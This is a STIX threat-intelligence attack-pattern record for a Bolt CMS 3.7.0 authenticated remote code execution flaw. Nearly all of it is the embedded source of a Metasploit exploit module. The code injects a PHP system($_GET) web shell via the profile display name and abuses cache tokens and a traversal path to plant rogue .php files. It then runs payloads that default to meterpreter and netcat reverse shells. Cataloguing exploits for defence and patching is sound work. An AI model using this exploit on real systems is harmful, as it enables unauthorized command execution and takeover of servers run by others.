{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cc7d9330-1928-4151-bf2a-1afa1b2539cc",
    "created": "2024-08-14T17:12:19.663951Z",
    "modified": "2024-08-14T17:12:19.663954Z",
    "name": "Bolt CMS 3.7.0 - Authenticated Remote Code Execution",
    "description": " This module exploits multiple vulnerabilities in Bolt CMS version 3.7.0 and 3.6.* in order to execute arbitrary commands as the user running Bolt.  This module first takes advantage of a vulnerability that allows an authenticated user to change the username in /bolt/profile to a PHP `system($_GET[\"\"])` variable. Next, the module obtains a list of tokens from `/async/browse/cache/.sessions` and uses these to create files with the blacklisted `.php` extention via HTTP POST requests to `/async/folder/rename`. For each created file, the module checks the HTTP response for evidence that the file can be used to execute arbitrary commands via the created PHP $_GET variable. If the response is negative the file is deleted, otherwise the payload is executed via an HTTP get request in this format: `/files/<rogue_PHP_file>?<$_GET_var>=<payload>`  Valid credentials for a Bolt CMS user are required. This module has been successfully tested against Bolt CMS 3.7.0 running on CentOS 7.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/bolt_authenticated_rce.rb",
            "external_id": "bolt_authenticated_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bolt/bolt/releases/tag/3.7.1#BoltCMS3.7.1releaseinfomentioningthisissueandthediscoverybySivaneshAshok"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Bolt CMS 3.7.0 - Authenticated Remote Code Execution',\n        'Description' => %q{\n          This module exploits multiple vulnerabilities in Bolt CMS version 3.7.0\n          and 3.6.* in order to execute arbitrary commands as the user running Bolt.\n\n          This module first takes advantage of a vulnerability that allows an\n          authenticated user to change the username in /bolt/profile to a PHP\n          `system($_GET[\"\"])` variable. Next, the module obtains a list of tokens\n          from `/async/browse/cache/.sessions` and uses these to create files with\n          the blacklisted `.php` extention via HTTP POST requests to\n          `/async/folder/rename`. For each created file, the module checks the HTTP\n          response for evidence that the file can be used to execute arbitrary\n          commands via the created PHP $_GET variable. If the response is negative,\n          the file is deleted, otherwise the payload is executed via an HTTP\n          get request in this format: `/files/<rogue_PHP_file>?<$_GET_var>=<payload>`\n\n          Valid credentials for a Bolt CMS user are required. This module has been\n          successfully tested against Bolt CMS 3.7.0 running on CentOS 7.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Sivanesh Ashok', # Discovery\n          'r3m0t3nu11', # PoC\n          'Erik Wynter' # @wyntererik - Metasploit\n        ],\n        'References' => [\n          ['EDB', '48296'],\n          ['URL', 'https://github.com/bolt/bolt/releases/tag/3.7.1'] # Bolt CMS 3.7.1 release info mentioning this issue and the discovery by Sivanesh Ashok\n        ],\n        'Platform' => ['linux', 'unix'],\n        'Arch' => [ARCH_X86, ARCH_X64, ARCH_CMD],\n        'Targets' => [\n          [\n            'Linux (x86)', {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Linux (x64)', {\n              'Arch' => ARCH_X64,\n              'Platform' => 'linux',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Linux (cmd)', {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_netcat'\n              }\n            }\n          ]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2020-05-07', # this the date a patch was released, since the disclosure data is not known at this time\n        'DefaultOptions' => {\n          'RPORT' => 8000,\n          'WfsDelay' => 5\n        },\n        'DefaultTarget' => 2,\n        'Notes' => {\n          'NOCVE' => ['0day'],\n          'Stability' => [SERVICE_RESOURCE_LOSS], # May hang up the service\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options [\n      OptString.new('TARGETURI', [true, 'Base path to Bolt CMS', '/']),\n      OptString.new('USERNAME', [true, 'Username to authenticate with', false]),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', false]),\n      OptString.new('FILE_TRAVERSAL_PATH', [true, 'Traversal path from \"/files\" on the web server to \"/root\" on the server', '../../../public/files'])\n    ]\n  end\n\n  def check\n    # obtain token and cookie required for login\n    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'bolt', 'login')\n\n    return CheckCode::Unknown('Connection failed') unless res\n\n    unless res.code == 200 && res.body.include?('Sign in to Bolt')\n      return CheckCode::Safe('Target is not a Bolt CMS application.')\n    end\n\n    html = res.get_html_document\n    token = html.at('input[@id=\"user_login__token\"]')['value']\n    cookie = res.get_cookies\n\n    # perform login\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'bolt', 'login'),\n      'cookie' => cookie,\n      'vars_post' => {\n        'user_login[username]' => datastore['USERNAME'],\n        'user_login[password]' => datastore['PASSWORD'],\n        'user_login[login]' => '',\n        'user_login[_token]' => token\n      }\n    })\n\n    return CheckCode::Unknown('Connection failed') unless res\n\n    unless res.code == 302 && res.body.include?('Redirecting to /bolt')\n      return CheckCode::Unknown('Failed to authenticate to the server.')\n    end\n\n    @cookie = res.get_cookies\n    return unless @cookie\n\n    # visit profile page to obtain user_profile token and user email\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'bolt', 'profile'),\n      'cookie' => @cookie\n    })\n\n    return CheckCode::Unknown('Connection failed') unless res\n\n    unless res.code == 200 && res.body.include?('<title>Profile')\n      return CheckCode::Unknown('Failed to authenticate to the server.')\n    end\n\n    html = res.get_html_document\n\n    @email = html.at('input[@type=\"email\"]')['value'] # this is used later to revert all changes to the user profile\n    unless @email # create fake email if this value is not found\n      @email = Rex::Text.rand_text_alpha_lower(5..8)\n      @email << \"@#{@email}.\"\n      @email << Rex::Text.rand_text_alpha_lower(2..3)\n      print_error(\"Failed to obtain user email. Using #{@email} instead. This will be visible on the user profile.\")\n    end\n\n    @profile_token = html.at('input[@id=\"user_profile__token\"]')['value'] # this is needed to rename the user (below)\n\n    if !@profile_token || @profile_token.to_s.empty?\n      return CheckCode::Unknown('Authentication failure.')\n    end\n\n    # change user profile to a php $_GET variable\n    @php_var_name = Rex::Text.rand_text_alpha_lower(4..6)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'bolt', 'profile'),\n      'cookie' => @cookie,\n      'vars_post' => {\n        'user_profile[password][first]' => datastore['PASSWORD'],\n        'user_profile[password][second]' => datastore['PASSWORD'],\n        'user_profile[email]' => @email,\n        'user_profile[displayname]' => \"<?php system($_GET['#{@php_var_name}']);?>\",\n        'user_profile[save]' => '',\n        'user_profile[_token]' => @profile_token\n      }\n    })\n\n    return CheckCode::Unknown('Connection failed') unless res\n\n    # visit profile page again to verify the changes\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'bolt', 'profile'),\n      'cookie' => @cookie\n    })\n\n    return CheckCode::Unknown('Connection failed') unless res\n\n    unless res.code == 200 && res.body.include?(\"php system($_GET[&#039;#{@php_var_name}&#039\")\n      return CheckCode::Unknown('Authentication failure.')\n    end\n\n    CheckCode::Vulnerable(\"Successfully changed the /bolt/profile username to PHP $_GET variable \\\"#{@php_var_name}\\\".\")\n  end\n\n  def exploit\n    csrf\n    unless @csrf_token && !@csrf_token.empty?\n      fail_with Failure::NoAccess, 'Failed to obtain CSRF token'\n    end\n    vprint_status(\"Found CSRF token: #{@csrf_token}\")\n\n    file_tokens = obtain_cache_tokens\n    unless file_tokens && !file_tokens.empty?\n      fail_with Failure::NoAccess, 'Failed to obtain tokens for creating .php files.'\n    end\n    print_status(\"Found #{file_tokens.length} potential token(s) for creating .php files.\")\n\n    token_results = try_tokens(file_tokens)\n    unless token_results && !token_results.empty?\n      fail_with Failure::NoAccess, 'Failed to create a .php file that can be used for RCE. This may happen on occasion. You can try rerunning the module.'\n    end\n\n    valid_token = token_results[0]\n    @rogue_file = token_results[1]\n\n    print_good(\"Used token #{valid_token} to create #{@rogue_file}.\")\n    if target.arch.first == ARCH_CMD\n      execute_command(payload.encoded)\n    else\n      execute_cmdstager\n    end\n  end\n\n  def csrf\n    # visit /bolt/overview/showcases to get csrf token\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'bolt', 'overview', 'showcases'),\n      'cookie' => @cookie\n    })\n\n    fail_with Failure::Unreachable, 'Connection failed' unless res\n\n    unless res.code == 200 && res.body.include?('Showcases')\n      fail_with Failure::NoAccess, 'Failed to obtain CSRF token'\n    end\n\n    html = res.get_html_document\n    @csrf_token = html.at('div[@class=\"buic-listing\"]')['data-bolt_csrf_token']\n  end\n\n  def obtain_cache_tokens\n    # obtain tokens for creating rogue .php files from cache\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'async', 'browse', 'cache', '.sessions'),\n      'cookie' => @cookie\n    })\n\n    fail_with Failure::Unreachable, 'Connection failed' unless res\n\n    unless res.code == 200 && res.body.include?('entry disabled')\n      fail_with Failure::NoAccess, 'Failed to obtain file impersonation tokens'\n    end\n\n    html = res.get_html_document\n    entries = html.search('tr')\n    tokens = []\n    entries.each do |e|\n      token = e.at('span[@class=\"entry disabled\"]').text.strip\n      size = e.at('div[@class=\"filesize\"]')['title'].strip.split(' ')[0]\n      tokens.append(token) if size.to_i >= 2000\n    end\n\n    tokens\n  end\n\n  def try_tokens(file_tokens)\n    # create .php files and check if any of them can be used for RCE via the username $_GET variable\n    file_tokens.each do |token|\n      file_path = datastore['FILE_TRAVERSAL_PATH'].chomp('/') # remove trailing `/` in case present\n      file_name = Rex::Text.rand_text_alpha_lower(8..12)\n      file_name << '.php'\n\n      # use token to create rogue .php file by 'renaming' a file from cache\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'async', 'folder', 'rename'),\n        'cookie' => @cookie,\n        'vars_post' => {\n          'namespace' => 'root',\n          'parent' => '/app/cache/.sessions',\n          'oldname' => token,\n          'newname' => \"#{file_path}/#{file_name}\",\n          'token' => @csrf_token\n        }\n      })\n\n      fail_with Failure::Unreachable, 'Connection failed' unless res\n\n      next unless res.code == 200 && res.body.include?(file_name)\n\n      # check if .php file contains an empty `displayname` value. If so, cmd execution should work.\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, 'files', file_name),\n        'cookie' => @cookie\n      })\n\n      fail_with Failure::Unreachable, 'Connection failed' unless res\n\n      # the response should contain a string formatted like: `displayname\";s:31:\"\"` but `s` can be a different letter and `31` a different number\n      unless res.code == 200 && res.body.match(/displayname\";[a-z]:\\d{1,2}:\"\"/)\n        delete_file(file_name)\n        next\n      end\n\n      return token, file_name\n    end\n\n    nil\n  end\n\n  def execute_command(cmd, _opts = {})\n    if target.arch.first == ARCH_CMD\n      print_status(\"Attempting to execute the payload via \\\"/files/#{@rogue_file}?#{@php_var_name}=`payload`\\\"\")\n    end\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'files', @rogue_file),\n      'cookie' => @cookie,\n      'vars_get' => { @php_var_name => \"(#{cmd}) > /dev/null &\" } # HACK: Don't block on stdout\n    }, 3.5)\n\n    # the response should contain a string formatted like: `displayname\";s:31:\"\"` but `s` can be a different letter and `31` a different number\n    unless res && res.code == 200 && res.body.match(/displayname\";[a-z]:\\d{1,2}:\"\"/)\n      print_warning('No response, may have executed a blocking payload!')\n      return\n    end\n\n    print_good('Payload executed!')\n  end\n\n  def cleanup\n    super\n\n    # delete rogue .php file used for execution (if present)\n    delete_file(@rogue_file) if @rogue_file\n\n    return unless @profile_token\n\n    # change user profile back to original\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'bolt', 'profile'),\n      'cookie' => @cookie,\n      'vars_post' => {\n        'user_profile[password][first]' => datastore['PASSWORD'],\n        'user_profile[password][second]' => datastore['PASSWORD'],\n        'user_profile[email]' => @email,\n        'user_profile[displayname]' => datastore['USERNAME'].to_s,\n        'user_profile[save]' => '',\n        'user_profile[_token]' => @profile_token\n      }\n    })\n\n    unless res\n      print_warning('Failed to revert user profile back to original state.')\n      return\n    end\n\n    # visit profile page again to verify the changes\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'bolt', 'profile'),\n      'cookie' => @cookie\n    })\n\n    unless res && res.code == 200 && res.body.include?(datastore['USERNAME'].to_s)\n      print_warning('Failed to revert user profile back to original state.')\n    end\n\n    print_good('Reverted user profile back to original state.')\n  end\n\n  def delete_file(file_name)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'async', 'file', 'delete'),\n      'cookie' => @cookie,\n      'vars_post' => {\n        'namespace' => 'files',\n        'filename' => file_name,\n        'token' => @csrf_token\n      }\n    })\n\n    unless res && res.code == 200 && res.body.include?(file_name)\n      print_warning(\"Failed to delete file #{file_name}. Manual cleanup required.\")\n    end\n\n    print_good(\"Deleted file #{file_name}.\")\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-05-07, # this the date a patch was released, since the disclosure data is not known at this time",
    "x_mitre_platforms": [
        "unix'"
    ]
}